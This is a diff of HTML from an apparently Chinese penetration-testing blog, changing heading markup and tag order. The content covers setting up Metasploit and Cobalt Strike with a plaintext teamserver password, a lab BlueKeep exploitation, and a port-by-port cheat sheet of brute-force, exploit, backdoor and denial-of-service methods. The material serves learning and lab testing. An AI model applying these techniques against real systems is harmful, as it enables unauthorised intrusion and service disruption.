-<h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h3><p>虽然其他服务都能够正常的访问，但是却Ping不通，不知道是自己环境的问题还是ICMP协议通过代理后会有什么变化的问题。</p>
+<h3><span id="遗留问题">遗留问题</span></h3><p>虽然其他服务都能够正常的访问，但是却Ping不通，不知道是自己环境的问题还是ICMP协议通过代理后会有什么变化的问题。</p>
 <p>临时解决：<br>    虽然无法ping，但是可以直接通过CS拿下的机器进行信息收集等工作，感觉代理后Ping的通内网并不是刚需。</p>
 
     
@@ -1231,25 +1215,25 @@ bind_port <span class="token operator">=</span> <span class="token number">9998<
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="Ubuntu-Metasploit-CobaltStrike4-0"><a href="#Ubuntu-Metasploit-CobaltStrike4-0" class="headerlink" title="Ubuntu + Metasploit + CobaltStrike4.0"></a>Ubuntu + Metasploit + CobaltStrike4.0</h1><p>内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。</p>
-<h2 id="Ubuntu-搭建"><a href="#Ubuntu-搭建" class="headerlink" title="Ubuntu 搭建"></a>Ubuntu 搭建</h2><p>Ubuntu 18.04 <a href="http://mirrors.aliyun.com/ubuntu-releases/18.04/" target="_blank" rel="noopener">http://mirrors.aliyun.com/ubuntu-releases/18.04/</a><br>之后在VMware中创建之后启动起来，设置用户名密码完成。配置一下以下几点平时使用更方便：</p>
-<h3 id="Ⅰ-使用root登陆"><a href="#Ⅰ-使用root登陆" class="headerlink" title="Ⅰ 使用root登陆"></a>Ⅰ 使用root登陆</h3><pre class="line-numbers language-python"><code class="language-python">sudo passwd root
+    <h1><span id="ubuntu-metasploit-cobaltstrike40">Ubuntu + Metasploit + CobaltStrike4.0</span></h1><p>内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。</p>
+<h2><span id="ubuntu-搭建">Ubuntu 搭建</span></h2><p>Ubuntu 18.04 <a href="http://mirrors.aliyun.com/ubuntu-releases/18.04/" target="_blank" rel="noopener">http://mirrors.aliyun.com/ubuntu-releases/18.04/</a><br>之后在VMware中创建之后启动起来，设置用户名密码完成。配置一下以下几点平时使用更方便：</p>
+<h3><span id="i-使用root登陆">Ⅰ 使用root登陆</span></h3><pre class="line-numbers language-python"><code class="language-python">sudo passwd root
 设置密码
 重复密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>使用root进行登录</p>
-<h3 id="Ⅱ-安装SSH服务"><a href="#Ⅱ-安装SSH服务" class="headerlink" title="Ⅱ 安装SSH服务"></a>Ⅱ 安装SSH服务</h3><pre class="line-numbers language-python"><code class="language-python">sudo apt install openssh<span class="token operator">-</span>server
+<h3><span id="ii-安装ssh服务">Ⅱ 安装SSH服务</span></h3><pre class="line-numbers language-python"><code class="language-python">sudo apt install openssh<span class="token operator">-</span>server
 sudo service ssh start
 sudo apt install openssh<span class="token operator">-</span>client<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h3 id="Ⅲ-SSH开启ROOT登陆"><a href="#Ⅲ-SSH开启ROOT登陆" class="headerlink" title="Ⅲ SSH开启ROOT登陆"></a>Ⅲ SSH开启ROOT登陆</h3><pre class="line-numbers language-python"><code class="language-python">vim <span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>sshd_config
+<h3><span id="iii-ssh开启root登陆">Ⅲ SSH开启ROOT登陆</span></h3><pre class="line-numbers language-python"><code class="language-python">vim <span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>sshd_config
 添加或修改 PermitRootLogin yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="/images/12/1.png" alt></p>
 <p>最后SSH使用ROOT登陆<br><img src="/images/12/2.png" alt></p>
-<h2 id="Metasploit-搭建"><a href="#Metasploit-搭建" class="headerlink" title="Metasploit 搭建"></a>Metasploit 搭建</h2><p>在根目录创建msf文件进入后执行</p>
+<h2><span id="metasploit-搭建">Metasploit 搭建</span></h2><p>在根目录创建msf文件进入后执行</p>
 <pre class="line-numbers language-python"><code class="language-python">curl https<span class="token punctuation">:</span><span class="token operator">//</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>rapid7<span class="token operator">/</span>metasploit<span class="token operator">-</span>omnibus<span class="token operator">/</span>master<span class="token operator">/</span>config<span class="token operator">/</span>templates<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">-</span>wrappers<span class="token operator">/</span>msfupdate<span class="token punctuation">.</span>erb <span class="token operator">></span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> chmod <span class="token number">755</span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">.</span><span class="token operator">/</span>msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>安装后<code>msfconsole</code>进入</p>
 <p><img src="/images/12/3.png" alt></p>
 <p>简单无脑，直接进入。</p>
-<h2 id="CobaltStrike4-0-搭建"><a href="#CobaltStrike4-0-搭建" class="headerlink" title="CobaltStrike4.0 搭建"></a>CobaltStrike4.0 搭建</h2><p>将CobaltStrike4.0.zip文件夹复制到/cs4/下后执行</p>
+<h2><span id="cobaltstrike40-搭建">CobaltStrike4.0 搭建</span></h2><p>将CobaltStrike4.0.zip文件夹复制到/cs4/下后执行</p>
 <pre class="line-numbers language-python"><code class="language-python">unzip CobaltStrike4<span class="token number">.0</span><span class="token punctuation">.</span>zip
 cd CobaltStrike4<span class="token number">.0</span><span class="token operator">/</span>
 <span class="token punctuation">.</span><span class="token operator">/</span>teamserver <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.47</span> wlsmile123<span class="token punctuation">.</span><span class="token punctuation">.</span>
@@ -1259,7 +1243,7 @@ cd CobaltStrike4<span class="token number">.0</span><span class="token operator"
 <p>在本地windows打cs客户端，输入用户名密码。</p>
 <p><img src="/images/12/5.png" alt></p>
 <p>连接。<br><img src="/images/12/6.png" alt></p>
-<h1 id="小试牛刀-msf与cs互传shell"><a href="#小试牛刀-msf与cs互传shell" class="headerlink" title="小试牛刀 msf与cs互传shell"></a>小试牛刀 msf与cs互传shell</h1><h2 id="复现-cve-2019-0708-bluekeep-rce"><a href="#复现-cve-2019-0708-bluekeep-rce" class="headerlink" title="复现 cve_2019_0708_bluekeep_rce"></a>复现 cve_2019_0708_bluekeep_rce</h2><p>靶机：192.168.27.46 win7<br>本机：192.168.27.47 Ubuntu</p>
+<h1><span id="小试牛刀-msf与cs互传shell">小试牛刀 msf与cs互传shell</span></h1><h2><span id="复现-cve_2019_0708_bluekeep_rce">复现 cve_2019_0708_bluekeep_rce</span></h2><p>靶机：192.168.27.46 win7<br>本机：192.168.27.47 Ubuntu</p>
 <p>启动msf后搜索0708</p>
 <pre class="line-numbers language-python"><code class="language-python">msf6 <span class="token operator">></span> search <span class="token number">0708</span>
 
@@ -1454,7 +1438,7 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="端口信息及漏洞利用总结"><a href="#端口信息及漏洞利用总结" class="headerlink" title="端口信息及漏洞利用总结"></a>端口信息及漏洞利用总结</h1><table>
+    <h1><span id="端口信息及漏洞利用总结">端口信息及漏洞利用总结</span></h1><table>
 <thead>
 <tr>
 <th>端口</th>
@@ -1668,7 +1652,7 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
 <td>未授权访问/爆破</td>
 </tr>
 </tbody></table>
-<h2 id="21端口利用"><a href="#21端口利用" class="headerlink" title="21端口利用"></a>21端口利用</h2><blockquote>
+<h2><span id="21端口利用">21端口利用</span></h2><blockquote>
 <p>FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透FTP服务器的几种方法。。</p>
 </blockquote>
 <pre><code>（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。
@@ -1677,31 +1661,31 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
 （4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。
 （5）ftp远程代码溢出。（https://blog.csdn.net/weixin_42214273/article/details/82892282）
 （6）ftp跳转攻击。（https://blog.csdn.net/mgxcool/article/details/48249473）
-</code></pre><h2 id="22端口渗透剖析"><a href="#22端口渗透剖析" class="headerlink" title="22端口渗透剖析"></a>22端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="22端口渗透剖析">22端口渗透剖析</span></h2><blockquote>
 <p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
 </blockquote>
 <pre><code>（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。
 （2）防火墙SSH后门。（https://www.secpulse.com/archives/69093.html）
 （3）28退格 OpenSSL
 （4）openssh 用户枚举 CVE-2018-15473。（https://www.anquanke.com/post/id/157607）
-</code></pre><h2 id="23端口渗透剖析"><a href="#23端口渗透剖析" class="headerlink" title="23端口渗透剖析"></a>23端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="23端口渗透剖析">23端口渗透剖析</span></h2><blockquote>
 <p>telnet是一种旧的远程管理方式，使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。</p>
 </blockquote>
 <pre><code>（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。
 （2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。
-</code></pre><h2 id="25-465端口渗透剖析"><a href="#25-465端口渗透剖析" class="headerlink" title="25/465端口渗透剖析"></a>25/465端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="25465端口渗透剖析">25/465端口渗透剖析</span></h2><blockquote>
 <p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件</p>
 </blockquote>
 <pre><code>默认端口：25（smtp）、465（smtps）
 （1）爆破：弱口令
 （2）未授权访问
-</code></pre><h2 id="53端口渗透剖析"><a href="#53端口渗透剖析" class="headerlink" title="53端口渗透剖析"></a>53端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="53端口渗透剖析">53端口渗透剖析</span></h2><blockquote>
 <p>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式</p>
 </blockquote>
 <pre><code>（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（https://www.seebug.org/vuldb/ssvid-96718）
 （2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）
 （3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）（4）DNS劫持。（https://blog.csdn.net/qq_32447301/article/details/77542474）
-</code></pre><h2 id="80端口渗透剖析"><a href="#80端口渗透剖析" class="headerlink" title="80端口渗透剖析"></a>80端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="80端口渗透剖析">80端口渗透剖析</span></h2><blockquote>
 <p>80端口通常提供web服务。目前黑客对80端口的攻击典型是采用SQL注入的攻击方法，脚本渗透技术也是一项综合性极高的web渗透技术，同时脚本渗透技术对80端口也构成严重的威胁。</p>
 </blockquote>
 <pre><code>（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。
@@ -1711,63 +1695,63 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
 （5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。
 （6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。
 （7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。
-</code></pre><h2 id="135端口渗透剖析"><a href="#135端口渗透剖析" class="headerlink" title="135端口渗透剖析"></a>135端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="135端口渗透剖析">135端口渗透剖析</span></h2><blockquote>
 <p>135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’病毒就是利用这个漏洞进行传播的。对于135端口的渗透，黑客的渗透方法为:</p>
 </blockquote>
 <pre><code>（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）
 （2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。（https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）
-</code></pre><h2 id="139-445端口渗透剖析"><a href="#139-445端口渗透剖析" class="headerlink" title="139/445端口渗透剖析"></a>139/445端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="139445端口渗透剖析">139/445端口渗透剖析</span></h2><blockquote>
 <p>139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。</p>
 </blockquote>
 <pre><code>（1）对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（https://blog.csdn.net/qq_41880069/article/details/82908131）
 （2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（https://blog.csdn.net/god_7z1/article/details/6773652）
 （3）对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（https://blog.warhut.cn/dmbj/145.html）
 （4）对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。
-</code></pre><h2 id="1433端口渗透剖析"><a href="#1433端口渗透剖析" class="headerlink" title="1433端口渗透剖析"></a>1433端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="1433端口渗透剖析">1433端口渗透剖析</span></h2><blockquote>
 <p>1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP/IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。</p>
 </blockquote>
 <pre><code>（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（https://blog.csdn.net/gxj022/article/details/4593015）
 （2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（https://blog.csdn.net/kali_linux/article/details/50499576）
 （3）嗅探技术同样能嗅探到SQL Server的登录密码。
 （4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。
-</code></pre><h2 id="1521端口渗透剖析"><a href="#1521端口渗透剖析" class="headerlink" title="1521端口渗透剖析"></a>1521端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="1521端口渗透剖析">1521端口渗透剖析</span></h2><blockquote>
 <p>1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：</p>
 </blockquote>
 <pre><code>（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。
 （2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。
 （3）在注入点直接创建java，执行系统命令。（4）https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html
-</code></pre><h2 id="2049端口渗透剖析"><a href="#2049端口渗透剖析" class="headerlink" title="2049端口渗透剖析"></a>2049端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="2049端口渗透剖析">2049端口渗透剖析</span></h2><blockquote>
 <p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
 </blockquote>
 <pre><code>未授权访问。（https://www.freebuf.com/articles/network/159468.html） (http://www.secist.com/archives/6192.htm)
-</code></pre><h2 id="3306端口渗透剖析"><a href="#3306端口渗透剖析" class="headerlink" title="3306端口渗透剖析"></a>3306端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="3306端口渗透剖析">3306端口渗透剖析</span></h2><blockquote>
 <p>3306是MYSQL数据库默认的监听端口，通常部署在中型web系统中。在国内LAMP的配置是非常流行的，对于php+mysql构架的攻击也是属于比较热门的话题。mysql数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于3306端口的渗透，黑客的方法如下:</p>
 </blockquote>
 <pre><code>（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。
 （2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。
 （3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。
-</code></pre><h2 id="3389端口渗透剖析"><a href="#3389端口渗透剖析" class="headerlink" title="3389端口渗透剖析"></a>3389端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="3389端口渗透剖析">3389端口渗透剖析</span></h2><blockquote>
 <p>3389是windows远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。</p>
 </blockquote>
 <pre><code>（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。
 （2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。
 （3）Shift粘滞键后门：5次shift后门
 （4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。（5）爆破3389端口。这里还是推荐使用hydra爆破工具。（6）ms12_020死亡蓝屏攻击。（https://www.cnblogs.com/R-Hacker/p/9178066.html）（7）https://www.cnblogs.com/backlion/p/9429738.html
-</code></pre><h2 id="4899端口渗透剖析"><a href="#4899端口渗透剖析" class="headerlink" title="4899端口渗透剖析"></a>4899端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="4899端口渗透剖析">4899端口渗透剖析</span></h2><blockquote>
 <p>4899端口是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP/IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：</p>
 </blockquote>
 <pre><code>（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。
 （2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。
-</code></pre><h2 id="5432端口渗透剖析"><a href="#5432端口渗透剖析" class="headerlink" title="5432端口渗透剖析"></a>5432端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="5432端口渗透剖析">5432端口渗透剖析</span></h2><blockquote>
 <p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
 </blockquote>
 <pre><code>（1）爆破：弱口令：postgres postgres
 （2）缓冲区溢出：CVE-2014-2669。（http://drops.xmd5.com/static/drops/tips-6449.html）（3）远程代码执行：CVE-2018-1058。（https://www.secpulse.com/archives/69153.html）
-</code></pre><h2 id="5631端口渗透剖析"><a href="#5631端口渗透剖析" class="headerlink" title="5631端口渗透剖析"></a>5631端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="5631端口渗透剖析">5631端口渗透剖析</span></h2><blockquote>
 <p>5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意下载保存连接密码的<code>*.cif文件</code>，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。</p>
 </blockquote>
 <pre><code>PcAnyWhere提权。（https://blog.csdn.net/Fly_hps/article/details/80377199）
-</code></pre><h2 id="5900端口渗透剖析"><a href="#5900端口渗透剖析" class="headerlink" title="5900端口渗透剖析"></a>5900端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="5900端口渗透剖析">5900端口渗透剖析</span></h2><blockquote>
 <p>5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：</p>
 </blockquote>
 <pre><code>（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。
@@ -1775,12 +1759,12 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
 （3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。
 （4）VNC拒绝服务攻击（CVE-2015-5239）。（http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）
 （5）VNC权限提升（CVE-2013-6886）。
-</code></pre><h2 id="6379端口渗透剖析"><a href="#6379端口渗透剖析" class="headerlink" title="6379端口渗透剖析"></a>6379端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="6379端口渗透剖析">6379端口渗透剖析</span></h2><blockquote>
 <p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p>
 </blockquote>
 <pre><code>（1）爆破：弱口令
 （2）未授权访问+配合ssh key提权。（http://www.alloyteam.com/2017/07/12910/）
-</code></pre><h2 id="7001-7002端口渗透剖析"><a href="#7001-7002端口渗透剖析" class="headerlink" title="7001/7002端口渗透剖析"></a>7001/7002端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="70017002端口渗透剖析">7001/7002端口渗透剖析</span></h2><blockquote>
 <p>7001/7002通常是weblogic中间件端口</p>
 </blockquote>
 <pre><code>（1）弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic
@@ -1788,7 +1772,7 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
 （3）SSRF
 （4）反序列化漏洞
 （5）weblogic_uachttps://github.com/vulhub/vulhub/tree/master/weblogic/ssrfhttps://bbs.pediy.com/thread-224954.htmhttps://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html
-</code></pre><h2 id="8080端口渗透剖析"><a href="#8080端口渗透剖析" class="headerlink" title="8080端口渗透剖析"></a>8080端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="8080端口渗透剖析">8080端口渗透剖析</span></h2><blockquote>
 <p>8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法：</p>
 </blockquote>
 <pre><code>（1）Tomcat远程代码执行漏洞（https://www.freebuf.com/column/159200.html）
@@ -1797,7 +1781,7 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
 （4）Jboss远程代码执行。（http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）
 （5）Jboss反序列化漏洞。（https://www.zybuluo.com/websec007/note/838374）
 （6）Jboss漏洞利用。（https://blog.csdn.net/u011215939/article/details/79141624）
-</code></pre><h2 id="27017端口渗透剖析"><a href="#27017端口渗透剖析" class="headerlink" title="27017端口渗透剖析"></a>27017端口渗透剖析</h2><blockquote>
+</code></pre><h2><span id="27017端口渗透剖析">27017端口渗透剖析</span></h2><blockquote>
 <p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似</p>
 </blockquote>
 <pre><code>（1）爆破：弱口令
@@ -1999,6 +1983,10 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
@@ -2007,11 +1995,11 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">免杀</a>
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -2019,19 +2007,11 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
               </li>
              
               <li class="article-tag-list-item">
